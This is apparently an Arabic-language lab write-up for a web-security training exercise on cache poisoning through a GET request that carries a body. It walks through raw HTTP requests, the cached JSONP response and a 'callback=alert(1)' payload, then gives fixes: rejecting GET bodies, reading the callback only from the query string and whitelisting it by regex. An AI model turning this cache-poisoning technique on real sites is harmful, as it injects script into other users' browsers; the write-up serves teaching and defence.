# [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

## **`الهدف`**
قم بتسميم الصفحة الرئيسية باستجابة تقوم بتنفيذ `alert(1)` في متصفح الضحية.
## **`خطوات الحل`**
سنبحث قليلًا في الـ `HTTP history` وسنجد هذا الطلب لملف `JS` والذي يتم استدعائه عند الدخول إلى أى صفحة في اللاب
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a9d007c047b169a8179c00700d3001e.web-security-academy.net
Cookie: country=[object Object]; session=sUGX2kMZ5fFOMAFXeNAaCmzNLwAF5hGo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: none
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Length: 17
```
وسنجد أن استجابته يتم حفظها في ذاكرة التخزين المؤقت كالتالي:
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 201

const setCountryCookie = (country) => {
	document.cookie = 'country=' + country;
};
const setLangCookie = (lang) => {
	document.cookie = 'lang=' + lang;
};
setCountryCookie({
	"country":"United Kingdom"
}
);
```
وبالتجربة سنلاحظ أنه إذا قمنا بوضع أى `callback` بقيمة أخرى مثل `TESTTEST` ستنعكس في الاستجابة:
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a9d007c047b169a8179c00700d3001e.web-security-academy.net
Cookie: country=[object Object]; session=sUGX2kMZ5fFOMAFXeNAaCmzNLwAF5hGo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: none
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Length: 0

callback=TESTTEST
```

```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 197

const setCountryCookie = (country) => {
	document.cookie = 'country=' + country;
};
const setLangCookie = (lang) => {
	document.cookie = 'lang=' + lang;
};
TESTEST

({
	"country":"United Kingdom"
}
);
```

لذلك سنقوم بتعديل الطلب ونضيف `callback=alert(1)`
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a9d007c047b169a8179c00700d3001e.web-security-academy.net
Cookie: country=[object Object]; session=sUGX2kMZ5fFOMAFXeNAaCmzNLwAF5hGo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: none
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Length: 21

callback=alert(1)
```

وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب رفض طلبات `GET` التي تحتوي على `Body` عن طريق إعداد سيرفر الويب (مثل `Nginx أو Apache)` أو الـ `WAF` لرفض أي طلب `GET` يحتوي على ترويسة `Content-Length` بقيمة أكبر من `0` أو `Transfer-Encoding`، وإرجاع استجابة `400 Bad Request`، لأنه حسب معايير` HTTP (RFCs)`، طلبات `GET` لا يُفترض أن تحمل بيانات في الـ `Body`.

يجب تعديل الكود البرمجي للتطبيق بحيث يتم قراءة `callback` فقط من الـ `Query String` في طلبات الـ `GET` ويتجاهل أي بيانات مرسلة في الـ `Body`.

ويجب تطبيق `Whitelist Validation` على المعلم `callback` لأن متغيرات الـ `JSONP callbacks` يجب ألا تقبل سوى الحروف الإنجليزية والأرقام والشرطة السفلية لذلك يجب إضافة فلتر  باستخدام تعبير نمطي `Regex` مثل `^[a-zA-Z0-9_]+$`.

وكخطوة إضافية إختيارية يُمكن ضبط سيرفرات التخزين المؤقت لتتجاهل تجزين أى استجابة لطلب `GET` إذا كان يحتوى على `Body`.
